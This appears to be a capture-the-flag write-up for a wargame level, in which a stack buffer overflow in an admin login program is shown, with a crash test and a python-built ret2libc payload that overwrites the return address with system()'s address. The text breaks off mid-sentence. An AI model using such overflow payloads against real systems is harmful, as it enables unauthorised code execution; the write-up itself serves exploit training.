# Level 01

The program asks for a username and a password.
But this is irrelevent because either way we are doing nothing with it.
However we need the good username to be able to access the password input.
The password buffer is 64 char long, but `fgets()` reads 100 chars, here is our overflow.
We see in the source code that the function that checks the user needs the `dat_wil` username.

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
I have no clue (yet)
nope, incorrect password...
```

Nice, now lets try to overflow it.

```bash
level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope, incorrect password...

Segmentation fault (core dumped)
level01@OverRide:~$ dmesg | tail -n1
[22893.142169] level01[7344]: segfault at 41414141 ip 0000000041414141 sp 00000000ffffd650 error 14
```

We see that we indeed have a segfault. Now we are going to do a ret2libc.
Basically we will change the return address to the one of `system()` to be able to launch a shell.

Lets try. `"\xd0\xae\xe6\xf7"` is the address of `system()`

```bash
level01@OverRide:~$ ./level01 < <(python -c 'print("dat_wil\n" + "*" * 80 + "\xd0\xae\xe6\xf7")')
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

sh: 1: %���: not found
Segmentation fault (core dumped)
```

Promising! We have this error: `sh: 1: %���: not found` that indicates that surely got into `system()`.
Lets verify with 